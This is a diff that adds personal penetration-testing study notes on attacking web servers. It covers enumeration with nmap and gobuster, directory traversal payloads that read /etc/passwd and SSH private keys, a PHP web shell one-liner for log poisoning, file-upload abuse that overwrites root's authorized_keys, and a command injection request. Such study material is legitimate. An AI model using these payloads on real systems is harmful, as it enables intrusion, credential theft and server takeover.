@@ -1,0 +1,104 @@
+steps.webserver
+
+nmap 
+    nmap -p<port>  -sV  <Target>
+    nmap -p<port> --script=http-enum
+
+
+use burpe browser
+
+visit site look for names to so we can maye brute and SSH/RDP/ etc 
+that can cook while we do other work.
+
+Wappalyzer browser plugin to check tech stack 
+
+
+
+
+Gobuster Dir Enumeration
+
+    gobuster dir -u http://<target>:<port> -w /usr/share/wordlists/dirb/common.txt -t
+    gobuster dir -u http://<target>:<port> -w /usr/share/wordlists/dirb/big.txt -p pattern
+
+    exploring discovered directores    
+    gobuster dir -u <target>:<port>/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
+
+    robots.txt
+
+WordPress?   
+https://linuxconfig.org/test-wordpress-logins-with-hydra-on-kali-linux
+
+
+Directory Traversal 
+
+    Look for something like this 
+
+    index.php?page=mypage.html
+
+    index.php?page=../../../../../../../../../etc/passwd
+
+    index.php?page=../../../../../../../../../var/log/apache2/access.log             
+    . if we can see this 
+    . look at changing browser user agent (p260)
+    . <?php echo system($_GET['cmd']); ?> 
+
+    ../../../../../../../../../home/username/.ssh/id_rsa  #other types of ssh methods challenge1
+
+   Windows file locations
+    IIS
+
+    C:\inetpub\logs\LogFiles\W3SVC1\
+    C:\inetpub\wwwroot\web.config
+
+
+    XAMMP
+     
+    C:\xampp\htdocs\
+    C:\xampp\mysql\bin\my.ini
+
+
+    Browser Debugger to look at code (p221)
+
+    Grab api info  -- 
+    Tinkering with the api using curl p230 
+
+    curl -i http://<target>:<port>/users/v1 
+
+    
+
+    XSS (p239)
+
+    check 
+    <script>alert(42)</script>
+
+
+File Upload Vulnerabilities (p271)
+
+    Executable Files
+        upload files that are executable by the web application
+
+        try uploading 
+        foo.txt
+        shellcode.php   # maybe Php pHp phP .. etc if extension filtering is on 
+
+
+    Non-Executable Files (p276)
+
+    overwrite the authorized_keys file in the home directory for root
+    ssh-keygen  (call it fileup.pub )
+    cat fileup.pub > authorized_keys
+    upload it using the relative path 
+             ../../../../../../../root/.ssh/authorized_keys
+    clean on on my side 
+    rm ~/.ssh/known_hosts
+
+
+Command Injection (p 280) 
+
+
+OS Command Injection (p280)
+ caommand allow to execute can be uset to execute YOUR commands 
+
+ allowed to execute git 
+ curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
+ will also execute ipconfig (could be shell code) 
